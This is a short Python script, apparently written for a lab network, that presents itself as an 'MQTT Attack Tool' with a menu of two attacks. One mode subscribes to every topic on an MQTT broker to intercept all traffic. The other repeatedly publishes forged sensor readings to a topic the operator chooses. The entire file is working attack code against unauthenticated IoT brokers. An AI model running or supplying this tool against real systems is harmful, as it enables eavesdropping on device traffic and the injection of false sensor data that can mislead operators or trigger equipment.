import paho.mqtt.client as mqtt
import time
import json

def on_connect(client, userdata, flags, rc):
    print(f"Connected with result code {rc}")
    client.subscribe("#")

def on_message(client, userdata, msg):
    print(f"[Intercepted] Topic: {msg.topic}, Message: {msg.payload.decode()}")

def mitm_attack():
    client = mqtt.Client("AttackerClient")
    client.on_connect = on_connect
    client.on_message = on_message
    
    broker_address = "192.168.56.10"
    client.connect(broker_address, 1883, 60)
    
    print(f"Listening for MQTT messages on {broker_address}...")
    client.loop_start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")
        client.loop_stop()
        client.disconnect()

def publish_fake_data():
    client = mqtt.Client("MaliciousPublisher")
    broker_address = "192.168.56.10"
    client.connect(broker_address, 1883, 60)
    
    topic = input("Enter target topic: ")
    
    try:
        while True:
            payload = {
                "device_id": "temp_sensor_01",
                "temperature": 99.9,  # Nhiệt độ bất thường
                "humidity": 99.9,
                "timestamp": time.time(),
                "battery": 10
            }
            client.publish(topic, json.dumps(payload))
            print(f"Published fake data to {topic}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting...")
        client.disconnect()

if __name__ == "__main__":
    print("MQTT Attack Tool")
    print("1. Intercept MQTT messages (MITM)")
    print("2. Publish fake data")
    choice = input("Select attack type: ")
    
    if choice == "1":
        mitm_attack()
    elif choice == "2":
        publish_fake_data()
    else:
        print("Invalid choice")